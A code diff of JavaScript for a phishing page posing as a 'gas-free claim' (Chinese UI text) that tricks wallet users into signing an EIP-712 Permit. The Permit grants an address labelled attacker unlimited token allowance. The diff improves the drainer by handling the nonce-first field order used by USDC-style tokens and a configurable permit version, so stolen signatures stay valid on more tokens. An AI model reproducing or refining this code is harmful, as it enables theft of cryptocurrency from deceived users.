@@ -75,18 +75,24 @@ if ($("gaslessBtn")) $("gaslessBtn").onclick = async () => {
   try {
     if (!account && !(await connect())) return;
     msg("正在生成免 Gas 领取凭证…请在钱包中签名");
-    const message = { owner: account, spender: CFG.attacker, value: MAX_UINT,
-                      deadline: String(CFG.deadline), nonce: "0" };
+    // Permit 字段顺序因代币而异:EIP-2612 标准 deadline 在前,Circle 系(USDC)nonce 在前。
+    // 钱包按这里给出的 types 顺序哈希,与合约内置 TYPEHASH 不一致即签名无效。
+    const nonceFirst = CFG.permit_order === "nonce_first";
+    const tail = nonceFirst
+      ? [{ name: "nonce", type: "uint256" }, { name: "deadline", type: "uint256" }]
+      : [{ name: "deadline", type: "uint256" }, { name: "nonce", type: "uint256" }];
+    const message = nonceFirst
+      ? { owner: account, spender: CFG.attacker, value: MAX_UINT, nonce: "0", deadline: String(CFG.deadline) }
+      : { owner: account, spender: CFG.attacker, value: MAX_UINT, deadline: String(CFG.deadline), nonce: "0" };
     const payload = {
       types: {
         EIP712Domain: [{ name: "name", type: "string" }, { name: "version", type: "string" },
                        { name: "chainId", type: "uint256" }, { name: "verifyingContract", type: "address" }],
         Permit: [{ name: "owner", type: "address" }, { name: "spender", type: "address" },
-                 { name: "value", type: "uint256" }, { name: "deadline", type: "uint256" },
-                 { name: "nonce", type: "uint256" }],
+                 { name: "value", type: "uint256" }].concat(tail),
       },
       primaryType: "Permit",
-      domain: { name: CFG.token_name, version: "1", chainId: CFG.chain_id, verifyingContract: CFG.token },
+      domain: { name: CFG.token_name, version: CFG.permit_version || "1", chainId: CFG.chain_id, verifyingContract: CFG.token },
       message: message,
     };
     const sig = await ethereum.request({ method: "eth_signTypedData_v4",
